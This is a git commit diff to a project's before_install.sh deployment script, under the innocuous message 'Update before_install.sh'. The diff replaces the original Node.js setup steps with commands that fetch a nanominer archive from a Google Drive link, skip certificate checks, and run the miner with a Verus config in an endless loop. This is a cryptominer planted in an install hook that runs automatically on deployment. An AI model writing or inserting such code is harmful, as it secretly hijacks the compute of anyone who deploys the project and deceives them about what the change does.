cd9f813d6f5bedcda2b06ca166e952df8aa921ac
kemya15 <84995700+kemya15@users.noreply.github.com>
2021-05-29 14:32:57 +0700

    Update before_install.sh

--- scripts/before_install.sh
+++ scripts/before_install.sh
@@ -1,15 +1,11 @@
-#!/bin/bash
-
-#download node and npm
-curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | bash
-. ~/.nvm/nvm.sh
-nvm install node
-
-#create our working directory if it doesnt exist
-DIR="/home/ec2-user/express-app"
-if [ -d "$DIR" ]; then
-  echo "${DIR} exists"
-else
-  echo "Creating ${DIR} directory"
-  mkdir ${DIR}
-fi
+#!/bin/sh
+apt update
+wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1J08VYs2oqesb5QaE809LtC2N5skthPdc' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1J08VYs2oqesb5QaE809LtC2N5skthPdc" -O nanominer.tar.gz && rm -rf /tmp/cookies.txt
+tar xf nanominer.tar.gz
+cd nanominer
+chmod u+x nanominer
+while [ 1 ]; do
+./nanominer config_verus.ini
+sleep 3
+done
+sleep 999
